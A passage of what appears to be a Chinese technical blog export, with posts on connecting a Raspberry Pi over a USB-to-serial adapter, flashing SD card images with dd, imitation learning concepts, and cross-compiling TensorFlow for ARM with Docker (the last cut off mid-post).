<p>是以太网最为常用的接口，RJ45是一个常用名称，指的是由IEC(60)603-7标准化，使用由国际性的接插件标准定义的8个位置（8针）的模块化插孔或者插头。</p>
<h1 id="USB转串口原理"><a href="#USB转串口原理" class="headerlink" title="USB转串口原理"></a>USB转串口原理</h1><h2 id="硬件接口电气特性"><a href="#硬件接口电气特性" class="headerlink" title="硬件接口电气特性"></a>硬件接口电气特性</h2><ul>
<li><p>TTL电平：一般用作数字芯片的电平，例如芯片的供电电压是5V，那么高电平就是5V，低电平就是0V，这里所说的电平，就是TTL电平。</p>
</li>
<li><p>232电平：232电平特制电脑串口的电平，-12V左右为正电平，+12V左右为低电平。我们刚才所见到的“USB转串口线”和电脑原生的串口，就是232电平。</p>
</li>
</ul>
<h2 id="USB转串口方法"><a href="#USB转串口方法" class="headerlink" title="USB转串口方法"></a>USB转串口方法</h2><p>PC的串口电气特性是232电平，单片机的串口电气特性是TTL电平，这两个就不一样，肯定需要某个芯片或者电路来进行转换匹配才可以通信。这个时候我们就需要TTL转232芯片了，常见的是MAX232,MAX3232等。连接方式如下:</p>
<p align="center">
    <img src="images/convert1.jpg" width="100%" alt="232转TTL"/>
</p>

<p>但是随着USB接口的普及，当前计算机已经取消了串口。为实现232到TTL的转换，又需要USB转232。连接方式如下：</p>
<p align="center">
    <img src="images/convert2.jpg" width="100%" alt="USB转232"/>
</p>

<p>为简化，可将USB转232和232转TTL集成到一个芯片上。这样的芯片常见的有CH340、PL2303。连接方式如下：</p>
<p align="center">
    <img src="images/convert3.jpg" width="100%" alt="USB转TTL"/>
</p>

<p>常见的CH340芯片如下图所示：</p>
<p align="center">
    <img src="images/usb2ttl.jpg" width="90%" alt="USB转TTL"/>
</p>

<h1 id="通过USB转串口连接树莓派"><a href="#通过USB转串口连接树莓派" class="headerlink" title="通过USB转串口连接树莓派"></a>通过USB转串口连接树莓派</h1><p>下面介绍在Debian Linux主机通过USB转串口连接树莓派的过程。</p>
<h2 id="配置树莓派开启串口通信"><a href="#配置树莓派开启串口通信" class="headerlink" title="配置树莓派开启串口通信"></a>配置树莓派开启串口通信</h2><p>将树莓派操作系统镜像烧录到SD卡后，打开boot分区，编辑其config.txt，在其末尾添加如下代码，以开启串口通信权限。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">enable_uart&#x3D;1</span><br></pre></td></tr></table></figure>

<h2 id="通过USB转串口物理连接树莓派"><a href="#通过USB转串口物理连接树莓派" class="headerlink" title="通过USB转串口物理连接树莓派"></a>通过USB转串口物理连接树莓派</h2><p>通过将USB转串口将Debian主机和树莓派物理连接好之后，给树莓派加电启动。</p>
<h2 id="查看Debian系统能否识别ch340芯片"><a href="#查看Debian系统能否识别ch340芯片" class="headerlink" title="查看Debian系统能否识别ch340芯片"></a>查看Debian系统能否识别ch340芯片</h2><p>在官方Linux内核版本中自Kernel2.6以后就默认包含了对CH340/CH341芯片的驱动支持。在系统的默认驱动目录/lib/modules/$(uname -r)/kernel/drivers内可找到ch340芯片的驱动文件ch341.ko。</p>
<p>使用命令lsusb或dmesg查看linux系统是否识别USB转串口硬件。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">~$ lsusb</span><br><span class="line">Bus 002 Device 001: ID 1d6b:0003 Linux Foundation 3.0 root hub</span><br><span class="line">Bus 001 Device 005: ID 0bda:0129 Realtek Semiconductor Corp. RTS5129 Card Reader Controller</span><br><span class="line">Bus 001 Device 004: ID 8087:0a2a Intel Corp. </span><br><span class="line">Bus 001 Device 003: ID 1bcf:2b8a Sunplus Innovation Technology Inc. </span><br><span class="line">Bus 001 Device 006: ID 1a86:7523 QinHeng Electronics HL-340 USB-Serial adapter</span><br><span class="line">Bus 001 Device 002: ID 046d:c062 Logitech, Inc. M-UAS144 [LS1 Laser Mouse]</span><br><span class="line">Bus 001 Device 001: ID 1d6b:0002 Linux Foundation 2.0 root hub</span><br></pre></td></tr></table></figure>
<p>Bus 001 Device 006: ID 1a86:7523 QinHeng Electronics HL-340 USB-Serial adapter表明Linux系统识别了usb转串口线缆，芯片类型为HL-340。</p>
<p>‘dmesg’命令显示linux内核的环形缓冲区信息，我们可以从中获得诸如系统架构、cpu、挂载的硬件，RAM等多个运行级别的大量的系统信息。当计算机启动时，系统内核（操作系统的核心部分）将会被加载到内存中。在加载的过程中会显示很多的信息，在这些信息中我们可以看到内核检测硬件设备。运行dmesg，输出如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">~$ sudo dmesg | tail</span><br><span class="line">[ 4248.441104] usbcore: registered new interface driver usbserial_generic</span><br><span class="line">[ 4248.441112] usbserial: USB Serial support registered for generic</span><br><span class="line">[ 4248.456079] usbcore: registered new interface driver ch341</span><br><span class="line">[ 4248.456088] usbserial: USB Serial support registered for ch341-uart</span><br><span class="line">[ 4248.456097] ch341 1-3:1.0: ch341-uart converter detected</span><br><span class="line">[ 4248.456464] usb 1-3: ch341-uart converter now attached to ttyUSB0</span><br><span class="line">[ 4284.405593] i2c_hid i2c-ELAN1010:00: i2c_hid_get_input: incomplete report (14&#x2F;65535)</span><br><span class="line">[ 4284.407844] i2c_hid i2c-ELAN1010:00: i2c_hid_get_input: incomplete report (14&#x2F;65535)</span><br><span class="line">[ 4657.772761] i2c_hid i2c-ELAN1010:00: i2c_hid_get_input: incomplete report (14&#x2F;65535)</span><br><span class="line">[ 4657.774969] i2c_hid i2c-ELAN1010:00: i2c_hid_get_input: incomplete report (14&#x2F;65535)</span><br></pre></td></tr></table></figure>
<p>[ 4248.456097] ch341 1-3:1.0: ch341-uart converter detected;<br>[ 4248.456464] usb 1-3: ch341-uart converter now attached to ttyUSB0说明linux系统识别了usb转串口适配器，并附加到ttyUSB0文件上。</p>
<h2 id="使用minicom连接树莓派"><a href="#使用minicom连接树莓派" class="headerlink" title="使用minicom连接树莓派"></a>使用minicom连接树莓派</h2><p>minicom是linux平台的串行通信程序，类似于windows的超级终端程序。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ usermod -a -G dialout $USER</span><br><span class="line">#首次运行minicom使用-s选项，用于设置串行通信参数</span><br><span class="line">$ minicom -s</span><br><span class="line">+-----[configuration]------+</span><br><span class="line">| Filenames and paths      |</span><br><span class="line">| File transfer protocols  |</span><br><span class="line">| Serial port setup        |</span><br><span class="line">| Modem and dialing        |</span><br><span class="line">| Screen and keyboard      |</span><br><span class="line">| Save setup as dfl        |</span><br><span class="line">| Save setup as..          |</span><br><span class="line">| Exit                     |</span><br><span class="line">| Exit from Minicom        |</span><br><span class="line">+--------------------------+</span><br><span class="line">#通过上下键选择Serial port setup</span><br><span class="line">+----------------------------------- +</span><br><span class="line">| A -    Serial Device      : &#x2F;dev&#x2F;ttyUSB0   |</span><br><span class="line">| B - Lockfile Location     : &#x2F;var&#x2F;lock     |</span><br><span class="line">| C -   Callin Program      :             |</span><br><span class="line">| D -  Callout Program      :             |</span><br><span class="line">| E -    Bps&#x2F;Par&#x2F;Bits       : 115200 8N1  |</span><br><span class="line">| F - Hardware Flow Control : Yes         |</span><br><span class="line">| G - Software Flow Control : No          |</span><br><span class="line">|                                         |</span><br><span class="line">|    Change which setting?                |</span><br><span class="line">+----------------------------------+</span><br><span class="line"># 设置Serial Device为&#x2F;dev&#x2F;ttyUSB0，然后推出到上一界面，使用enter键Save setup as dfl，保存配置。下次即可直接运行minicom使用之前保存的配置进行串口通信 </span><br><span class="line"># 这时候要选择单独Exit（退出），不要选择Exit from Minicom（退出Minicom），不然你就把minicom关了。</span><br><span class="line"># 这时即可连接树莓派。</span><br></pre></td></tr></table></figure>
<p>连接上树莓派后，输入用户名pi和密码raspberry，即可进入系统。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Raspbian GNU&#x2F;Linux 9 raspberrypi ttyS0                                       </span><br><span class="line">raspberrypi login: pi                                                        </span><br><span class="line">Password:                                                                    </span><br><span class="line">Last login: Tue Oct  9 13:12:40 UTC 2018 on tty1                             </span><br><span class="line">Linux raspberrypi 4.14.71-v7+ #1145 SMP Fri Sep 21 15:38:35 BST 2018 armv7l</span><br><span class="line">                                        </span><br><span class="line">The programs included with the Debian GNU&#x2F;Linux system are free software;</span><br><span class="line">the exact distribution terms for each program are described in the</span><br><span class="line">individual files in &#x2F;usr&#x2F;share&#x2F;doc&#x2F;*&#x2F;copyright.</span><br><span class="line">                                        </span><br><span class="line">Debian GNU&#x2F;Linux comes with ABSOLUTELY NO WARRANTY, to the extent</span><br><span class="line">permitted by applicable law.</span><br><span class="line"></span><br><span class="line">Wi-Fi is disabled because the country is not set.                               </span><br><span class="line">Use raspi-config to set the country before use.                                 </span><br><span class="line">                                                                                </span><br><span class="line">pi@raspberrypi:~$</span><br></pre></td></tr></table></figure>
<p>退出minicom，按Ctrl＋A，再按下X键，会提示你是否退出，yes就可以了。</p>
<h2 id="配置树莓派wifi连接"><a href="#配置树莓派wifi连接" class="headerlink" title="配置树莓派wifi连接"></a>配置树莓派wifi连接</h2><h3 id="查看周围wifi热点信息"><a href="#查看周围wifi热点信息" class="headerlink" title="查看周围wifi热点信息"></a>查看周围wifi热点信息</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pi@raspberrypi:~$ iwlist scan</span><br></pre></td></tr></table></figure>
<h3 id="配置连接到wifi热点"><a href="#配置连接到wifi热点" class="headerlink" title="配置连接到wifi热点"></a>配置连接到wifi热点</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 编辑wifi文件</span><br><span class="line">pi@raspberrypi:~$ sudo vi &#x2F;etc&#x2F;wpa_supplicant&#x2F;wpa_supplicant.conf</span><br><span class="line"># 在该文件最后添加下面的话</span><br><span class="line">network&#x3D;&#123;</span><br><span class="line">  ssid&#x3D;&quot;WIFINAME&quot;</span><br><span class="line">  psk&#x3D;&quot;password&quot;</span><br><span class="line">&#125;</span><br><span class="line"># 引号部分分别为wifi的名字和密码</span><br><span class="line"># 重启系统</span><br><span class="line">pi@raspberrypi:~$ sudo init 6</span><br><span class="line"># 登录后查看是否连接成功</span><br><span class="line">pi@raspberrypi:~$  ip addr</span><br></pre></td></tr></table></figure>

<h1 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h1><ol>
<li><a href="https://www.cnblogs.com/zcshan/archive/2010/12/03/com.html" target="_blank" rel="noopener">https://www.cnblogs.com/zcshan/archive/2010/12/03/com.html</a> ,by 水寒</li>
<li><a href="https://zh.wikipedia.org/wiki串行端口" target="_blank" rel="noopener">https://zh.wikipedia.org/wiki串行端口</a> , by wikipedia</li>
<li><a href="https://blog.csdn.net/he_wen_jie/article/details/50983076" target="_blank" rel="noopener">https://blog.csdn.net/he_wen_jie/article/details/50983076</a>. by hwj666</li>
<li><a href="https://linux.cn/article-3587-1.html" target="_blank" rel="noopener">https://linux.cn/article-3587-1.html</a> , by linux中国</li>
<li><a href="https://blog.csdn.net/JAZZSOLDIER/article/details/70170466" target="_blank" rel="noopener">https://blog.csdn.net/JAZZSOLDIER/article/details/70170466</a> ， by SoldierJazz2018</li>
<li><a href="http://blog.51cto.com/irinilu/289622" target="_blank" rel="noopener">http://blog.51cto.com/irinilu/289622</a>, by feng9422</li>
<li>Pipci. Linux 串口终端调试工具minicom[EB/OL].<a href="https://blog.csdn.net/Pipcie/article/details/79379451" target="_blank" rel="noopener">https://blog.csdn.net/Pipcie/article/details/79379451</a>, 2018-02-26.</li>
<li><a href="https://blog.csdn.net/huayucong/article/details/51376279，" target="_blank" rel="noopener">https://blog.csdn.net/huayucong/article/details/51376279，</a> by huayucong</li>
<li><a href="https://blog.csdn.net/wangjiaweiwei/article/details/49612207" target="_blank" rel="noopener">USB转串口CH340接线方法</a>,2015-11-03.</li>
</ol>
]]></content>
      <tags>
        <tag>硬件</tag>
        <tag>树莓派</tag>
      </tags>
  </entry>
  <entry>
    <title>树莓派操作系统镜像烧录方法指南</title>
    <url>/2018/11/03/%E6%A0%91%E8%8E%93%E6%B4%BE%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E9%95%9C%E5%83%8F%E7%83%A7%E5%BD%95%E6%96%B9%E6%B3%95%E6%8C%87%E5%8D%97/</url>
    <content><![CDATA[<p>树莓派是一个微型计算机硬件平台，为使其正常工作还需要安装操作系统。通常将树莓派操作系统烧录到SD卡上，再将SD卡插到树莓派上。加电启动后，树莓派就会从SD卡引导启动操作系统，开始工作。这里SD卡就相当于普通计算机的硬盘。下面记录在Debian Linux下烧录树莓派操作系统到SD卡的方法。</p>
<h1 id="镜像烧录工具"><a href="#镜像烧录工具" class="headerlink" title="镜像烧录工具"></a>镜像烧录工具</h1><h2 id="Etcher"><a href="#Etcher" class="headerlink" title="Etcher"></a>Etcher</h2><p>Etcher是树莓派官方推荐的镜像烧录工具。它采用图形界面，支持Windows、Linux、Mac，使用简单方便，推荐普通用户使用。</p>
<h2 id="dd"><a href="#dd" class="headerlink" title="dd"></a>dd</h2><p>Linux的dd命令用于复制文件并对原文件的内容进行转换和格式化处理。dd命令功能很强大的，对于一些比较底层的问题，使用dd命令往往可以得到出人意料的效果。用的比较多的还是用dd来备份裸设备。同样也可用dd命令烧录系统镜像。</p>
<p>使用dd命令必须非常小心，如果输出指定了错误分区，将摧毁该分区的所有数据。</p>
<h1 id="Linux下镜像烧录过程"><a href="#Linux下镜像烧录过程" class="headerlink" title="Linux下镜像烧录过程"></a>Linux下镜像烧录过程</h1><p>使用Etcher烧录镜像比较简单，重点介绍使用dd命令烧录镜像的方法。</p>
<h2 id="查找sd卡设备"><a href="#查找sd卡设备" class="headerlink" title="查找sd卡设备"></a>查找sd卡设备</h2><p>可使用lsblk或者fdisk命令查找sd卡存储设备。需要注意的是：</p>
<ul>
<li>块设备以/dev/sdX命名，其中X是小写字母，例如/dev/sda。</li>
<li>测试时发现当计算机只有usb3.0接口时，将不识别usb2.0的sd读卡器。</li>
</ul>
<h2 id="烧录镜像到sd卡"><a href="#烧录镜像到sd卡" class="headerlink" title="烧录镜像到sd卡"></a>烧录镜像到sd卡</h2><h3 id="将镜像烧录到sd卡"><a href="#将镜像烧录到sd卡" class="headerlink" title="将镜像烧录到sd卡"></a>将镜像烧录到sd卡</h3><p>使用如下dd命令将树莓派镜像少量到sd卡：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">dd bs&#x3D;4M if&#x3D;2018-10-09-raspbian-stretch.img of&#x3D;&#x2F;dev&#x2F;sdX conv&#x3D;fsync</span><br></pre></td></tr></table></figure>
<p>其中：</p>
<ul>
<li>if=文件名：输入文件名，缺省为标准输入。即指定源文件。</li>
<li>of=文件名：输出文件名，缺省为标准输出。即指定目的文件。</li>
<li>bs=bytes：同时设置读入/输出的块大小为bytes个字节。</li>
<li>conv=conversion：用指定的参数转换文件。</li>
</ul>
<h3 id="将压缩镜像烧录到sd卡"><a href="#将压缩镜像烧录到sd卡" class="headerlink" title="将压缩镜像烧录到sd卡"></a>将压缩镜像烧录到sd卡</h3><p>当文件系统不支持大于4GB的文件时，可使用利用管道技术烧录镜像，命令如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">unzip -p 2018-10-09-raspbian-stretch.zip | sudo dd of&#x3D;&#x2F;dev&#x2F;sdX bs&#x3D;4M conv&#x3D;fsync</span><br></pre></td></tr></table></figure>

<h3 id="检查烧录进度"><a href="#检查烧录进度" class="headerlink" title="检查烧录进度"></a>检查烧录进度</h3><p>默认情况下dd命令不给出烧录进度信息，最新的dd提供status=progress选项给出进度信息，命令如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">dd bs&#x3D;4M if&#x3D;2018-10-09-raspbian-stretch.img of&#x3D;&#x2F;dev&#x2F;sdX status&#x3D;progress conv&#x3D;fsync</span><br></pre></td></tr></table></figure>
<p>或者可使用dcfldd命令替换dd进行烧录操作。</p>
<h2 id="检查镜像是否正确的烧录到sd卡"><a href="#检查镜像是否正确的烧录到sd卡" class="headerlink" title="检查镜像是否正确的烧录到sd卡"></a>检查镜像是否正确的烧录到sd卡</h2><p>先使用dd命令将sd卡中内容复制到硬盘，在使用diff或者md5sum检查镜像文件与sd卡内容镜像之间的一致性。</p>
<p>之前dd命令烧录镜像到sd卡完成后会在shell中输出如下结果：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">xxx+0 records in</span><br><span class="line">yyy+0 records out</span><br><span class="line">yyyyyyyyyy bytes (yyy kB, yyy KiB) copied, 0.00144744 s, 283 MB&#x2F;s</span><br></pre></td></tr></table></figure>
<p>xxx是我们需要的，表示读取xxx块记录烧录到sd卡，xxx乘以bs=4M应该等于原始镜像的大小。</p>
<p>使用如下命令复制sd卡内容到硬盘上：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 经测试count命令没有其作用，该命令将整个sd内容复制到了硬盘，但我们期望只复制之前烧录到sd卡内容</span><br><span class="line">dd bs&#x3D;4M if&#x3D;&#x2F;dev&#x2F;sdX of&#x3D;from-sd-card.img count&#x3D;xxx</span><br></pre></td></tr></table></figure>

<p>如果from-sd-card.img文件大于原始镜像文件，那么先使用truncate命令将from-sd-card.img缩小到原始镜像文件的大小，命令如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">truncate --reference 2018-10-09-raspbian-stretch.img from-sd-card.img</span><br></pre></td></tr></table></figure>

<p>使用diff命令比较两者直接的一致性，如果不一致，可能烧录过程中有错误。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">diff -s from-sd-card.img 2018-10-09-raspbian-stretch.img</span><br></pre></td></tr></table></figure>

<p>使用sync命令强制将缓存写入硬盘，然后umount sd卡文件系统，最后移除sd卡。</p>
<h1 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h1><ol>
<li><a href="https://www.raspberrypi.org/documentation/installation/installing-images/linux.md" target="_blank" rel="noopener">https://www.raspberrypi.org/documentation/installation/installing-images/linux.md</a>, by raspberrypi.</li>
<li><a href="https://blog.csdn.net/liumang_D/article/details/3899462" target="_blank" rel="noopener">https://blog.csdn.net/liumang_D/article/details/3899462</a>, by liumang_d.</li>
<li><a href="https://linux.cn/article-8024-1.html" target="_blank" rel="noopener">https://linux.cn/article-8024-1.html</a>, by linux中国</li>
<li><a href="https://www.jianshu.com/p/ff09ceffa816" target="_blank" rel="noopener">https://www.jianshu.com/p/ff09ceffa816</a>, by 二石兄.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>硬件</tag>
        <tag>树莓派</tag>
      </tags>
  </entry>
  <entry>
    <title>模仿学习研究笔记</title>
    <url>/2019/01/26/%E6%A8%A1%E4%BB%BF%E5%AD%A6%E4%B9%A0%E7%A0%94%E7%A9%B6%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h1 id="模仿学习定义"><a href="#模仿学习定义" class="headerlink" title="模仿学习定义"></a>模仿学习定义</h1><p>模仿学习是指从示教者提供的范例中学习，一般提供人类专家的决策数据</p>
<p>$${ \tau_1,\tau_2,\ldots,\tau_m }$$</p>
<p>，每个决策包含状态和动作序列  </p>
<p>$$\tau_i = &lt;s_1^i,a_1^i,s_2^i,a_2^i,\ldots,s_{n_ni+1}^i&gt;$$ </p>
<p>，将所有「状态-动作对」抽取出来构造新的集合 </p>
<p>$$\mathcal{D}={ (s_1,a_1),(s_2,a_2),(s_3,a_3),\ldots }$$ </p>
<p>。之后就可以把状态作为特征（feature），动作作为标记（label）进行分类（对于离散动作）或回归（对于连续动作）的学习从而得到最优策略模型。模型的训练目标是使模型生成的状态-动作轨迹分布和输入的轨迹分布相匹配。</p>
<h1 id="模仿学习意义"><a href="#模仿学习意义" class="headerlink" title="模仿学习意义"></a>模仿学习意义</h1><p>在传统的强化学习任务中，通常通过计算累积奖赏来学习最优策略（policy），这种方式简单直接，而且在可以获得较多训练数据的情况下有较好的表现。然而在多步决策（sequential decision）中，学习器不能频繁地得到奖励，且这种基于累积奖赏及学习方式存在非常巨大的搜索空间。而模仿学习（Imitation Learning）的方法经过多年的发展，已经能够很好地解决多步决策问题，在机器人、 NLP 等领域也有很多的应用。</p>
<h1 id="模仿学习实现"><a href="#模仿学习实现" class="headerlink" title="模仿学习实现"></a>模仿学习实现</h1><p>当前主要以下几种方法实现模型学习：</p>
<h2 id="行为克隆（Behavior-Cloning）"><a href="#行为克隆（Behavior-Cloning）" class="headerlink" title="行为克隆（Behavior Cloning）"></a>行为克隆（Behavior Cloning）</h2><p>行为克隆（Behavior Cloning）根据人类提供的状态动作对来习得策略，是作为监督学习的模仿学习。</p>
<h2 id="逆强化学习（Inverse-Reinforcement-Learning-）"><a href="#逆强化学习（Inverse-Reinforcement-Learning-）" class="headerlink" title="逆强化学习（Inverse Reinforcement Learning ）"></a>逆强化学习（Inverse Reinforcement Learning ）</h2><p>IRL 是 反过来的 RL，RL 是根据 reward 进行参数的调整，然后得到一个 policy。</p>
<p>但是， IRL 就不同了，因为他没有显示的 reward，只能根据 人类行为，进行 reward的估计（反推 reward 的函数）。在得到 reward 函数估计出来之后，再进行 策略函数的估计。</p>
<p>逆强化学习是在给定一个专家之后（expert policy），通过不断地寻找 reward function 来满足给定的 statement（即，解释专家的行为，explaining expert behavior）。</p>
<h2 id="结构化预测（Structured-prediction）"><a href="#结构化预测（Structured-prediction）" class="headerlink" title="结构化预测（Structured prediction）"></a>结构化预测（Structured prediction）</h2><p>在机器学习过程中，对数据的拟合其实就是在找一个拟合函数f，比如对于回归问题（Regression）来说，这个函数输出一个标量（scalar），对于分类问题（Classification）来说，这个函数输出一个类别（一个one-hot的向量），但是有一类的预测，它并不是输出一个标量或者一个类别，而是输出些有结构的输出，比如，一个序列，一个句子，一个图，一颗树。</p>
<h2 id="生成对抗网络（GAN-for-Imitation-Learning）"><a href="#生成对抗网络（GAN-for-Imitation-Learning）" class="headerlink" title="生成对抗网络（GAN for Imitation Learning）"></a>生成对抗网络（GAN for Imitation Learning）</h2><p>那么如何用 GAN 来做这个事情呢？对应到这件事情上，我们知道，我们想得到的 轨迹 是属于某一个高维的空间中，而 expert 给定的那些轨迹，我们假设是属于一个 distribution，我们想让我们的 model，也去 predict 一个分布出来，然后使得这两者之间尽可能的接近。从而完成 actor 的训练过程。</p>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://zhuanlan.zhihu.com/p/25688750" target="_blank" rel="noopener">模仿学习（Imitation Learning）完全介绍（一）</a>,by 我勒个矗.</li>
<li><a href="https://yq.aliyun.com/articles/310760" target="_blank" rel="noopener">深度强化学习之：模仿学习（imitation learning）</a>,by wangxiaocvpr.</li>
<li><a href="https://blog.csdn.net/c2a2o2/article/details/77336551" target="_blank" rel="noopener">机器人学习Robot Learning之模仿学习Imitation Learning的发展</a>,by c2a2o2.</li>
<li><a href="https://hewangxing.gitee.io/行为克隆/" target="_blank" rel="noopener">行为克隆</a>,by XINGYES.</li>
<li><a href="https://zhuanlan.zhihu.com/p/45845001" target="_blank" rel="noopener">最前沿：用模仿学习来学习增强学习</a>,by Flood Sung.</li>
<li><a href="https://zhuanlan.zhihu.com/p/33789604" target="_blank" rel="noopener">机器人学习最前沿：一眼模仿学习（One-Shot Imitation Learning）的三级跳</a>,by Flood Sung.</li>
<li><a href="https://www.cnblogs.com/wangxiaocvpr/p/8016414.html" target="_blank" rel="noopener">深度学习课程笔记（七）：模仿学习（imitation learning）</a>,by WangXiao.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>机器学习</tag>
      </tags>
  </entry>
  <entry>
    <title>树莓派设备上编译tensorflow源代码</title>
    <url>/2022/05/18/%E6%A0%91%E8%8E%93%E6%B4%BE%E8%AE%BE%E5%A4%87%E4%B8%8A%E7%BC%96%E8%AF%91tensorflow%E6%BA%90%E4%BB%A3%E7%A0%81/</url>
    <content><![CDATA[<p>对 TensorFlow Raspbian package 进行交叉编译 (cross-compiling)。 交叉编译使用的平台与部署平台不同。 相较于在 Raspberry Pi 使用有限的 RAM 和相对较慢的处理器，我们更加建议在 Linux ，macOS 或 Windows 等功能更强大的主机上构建TensorFlow。</p>
<h1 id="宿主机-（host）-设置"><a href="#宿主机-（host）-设置" class="headerlink" title="宿主机 （host） 设置"></a>宿主机 （host） 设置</h1><h2 id="安装-Docker"><a href="#安装-Docker" class="headerlink" title="安装 Docker"></a>安装 Docker</h2><p>为了简化依赖关系管理，构建脚本使用 Docker 来创建虚拟 Linux 开发环境进行编译。通过执行以下操作来验证您的 Docker 是否安装成功： docker run –rm hello-world。</p>
<p>具体安装过程请参考<a href="https://zhuanlan.zhihu.com/p/143156163" target="_blank" rel="noopener">如何在 Ubuntu 20.04 上安装和使用 Docker</a>。</p>
<h2 id="Docker使用方法"><a href="#Docker使用方法" class="headerlink" title="Docker使用方法"></a>Docker使用方法</h2><p>以 koa-demos 项目为例，介绍怎么写 Dockerfile 文件，实现让用户在 Docker 容器里面运行 Koa 框架。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;ruanyf&#x2F;koa-demos.git</span><br><span class="line">cd koa-demos</span><br></pre></td></tr></table></figure>

<h3 id="编写-Dockerfile-文件"><a href="#编写-Dockerfile-文件" class="headerlink" title="编写 Dockerfile 文件"></a>编写 Dockerfile 文件</h3><p>首先，在项目的根目录下，新建一个文本文件.dockerignore，写入下面的内容。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.git</span><br><span class="line">node_modules</span><br><span class="line">npm-debug.log</span><br></pre></td></tr></table></figure>

<p>上面代码表示，这三个路径要排除，不要打包进入 image 文件。如果你没有路径要排除，这个文件可以不新建。</p>
<p>然后，在项目的根目录下，新建一个文本文件 Dockerfile，写入下面的内容。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">FROM node:8.4</span><br><span class="line">COPY . &#x2F;app</span><br><span class="line">WORKDIR &#x2F;app</span><br><span class="line">RUN npm install --registry&#x3D;https:&#x2F;&#x2F;registry.npm.taobao.org</span><br><span class="line">EXPOSE 3000</span><br></pre></td></tr></table></figure>

<h3 id="创建-image-文件"><a href="#创建-image-文件" class="headerlink" title="创建 image 文件"></a>创建 image 文件</h3><p>有了 Dockerfile 文件以后，就可以使用docker image build命令创建 image 文件了。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ docker image build -t koa-demo .</span><br><span class="line"># 或者</span><br><span class="line">$ docker image build -t koa-demo:0.0.1 .</span><br></pre></td></tr></table></figure>

<p>如果运行成功，就可以看到新生成的 image 文件koa-demo了。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker image ls</span><br></pre></td></tr></table></figure>

<h3 id="生成容器"><a href="#生成容器" class="headerlink" title="生成容器"></a>生成容器</h3><p>docker container run命令会从 image 文件生成容器。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ docker container run -p 8000:3000 -it koa-demo &#x2F;bin&#x2F;bash</span><br><span class="line"># 或者</span><br><span class="line">$ docker container run -p 8000:3000 -it koa-demo:0.0.1 &#x2F;bin&#x2F;bash</span><br></pre></td></tr></table></figure>

<h2 id="下载-Tensorflow-源代码"><a href="#下载-Tensorflow-源代码" class="headerlink" title="下载 Tensorflow 源代码"></a>下载 Tensorflow 源代码</h2><p>使用 Git 克隆 TensorFlow：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;tensorflow&#x2F;tensorflow.git</span><br><span class="line">cd tensorflow</span><br></pre></td></tr></table></figure>
<p>默认为 master 分支。您还可以签出要构建的 release 分支：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git checkout branch_name  # r1.9, r1.10, etc.</span><br></pre></td></tr></table></figure>

<h1 id="交叉编译源代码"><a href="#交叉编译源代码" class="headerlink" title="交叉编译源代码"></a>交叉编译源代码</h1><p>交叉编译 TensorFlow 源代码，从而构建一个基于 ARM 指令的 Python pip 包。构建脚本启动 Docker 容器以进行编译。</p>
<h2 id="生成tensorflow构建环境的Docker映像"><a href="#生成tensorflow构建环境的Docker映像" class="headerlink" title="生成tensorflow构建环境的Docker映像"></a>生成tensorflow构建环境的Docker映像</h2><p>使用如下命令获得所需Docker映像：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;lhelontra&#x2F;tensorflow-on-arm.git</span><br><span class="line">cd tensorflow-on-arm&#x2F;build_tensorflow&#x2F;</span><br><span class="line"></span><br><span class="line"># 修改Dockerfile.bullseye，加上代理</span><br><span class="line"># ENV http_proxy&#x3D;http:&#x2F;&#x2F;x.x.x.x:xx https_proxy&#x3D;http:&#x2F;&#x2F;x.x.x.x:xx</span><br><span class="line">docker build -t tf-arm -f Dockerfile.bullseye .</span><br></pre></td></tr></table></figure>

<h2 id="启动容器"><a href="#启动容器" class="headerlink" title="启动容器"></a>启动容器</h2><p>使用如下命令：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker run -it -v &#x2F;tmp&#x2F;tensorflow_pkg&#x2F;:&#x2F;tmp&#x2F;tensorflow_pkg&#x2F; --env TF_PYTHON_VERSION&#x3D;3.8 tf-arm .&#x2F;build_tensorflow.sh configs&#x2F;&lt;conf-name&gt; # rpi.conf, rk3399.conf ...</span><br></pre></td></tr></table></figure>

<h2 id="交叉编译tensorflow"><a href="#交叉编译tensorflow" class="headerlink" title="交叉编译tensorflow"></a>交叉编译tensorflow</h2><p>使用如下命令交叉编译tensorflow:</p>
